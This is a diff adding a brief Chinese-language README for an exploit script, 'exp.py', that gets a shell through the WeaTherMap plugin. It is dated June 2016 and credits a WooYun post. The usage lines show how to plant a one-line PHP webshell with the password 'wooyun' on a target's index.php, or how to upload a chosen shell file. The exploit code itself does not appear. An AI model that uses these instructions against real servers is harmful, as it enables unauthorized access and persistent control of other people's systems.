@@ -1,0 +1,13 @@
+# WeaTherMap插件 getshell
+ 
+时间：2016年6月24日
+
+来源:http://zone.wooyun.org/content/28036
+
+#使用说明：只适合上一句话shell
+
+1、默认写入一句话: 密码：wooyun
+    python exp.py -u http://xxx.xxx.xxx.xxx/index.php
+2、上传指定的一句话shell：
+
+    python exp.py -u http://xxx.xxx.xxx.xxx/index.php -f /root/Desktop/myshell.php
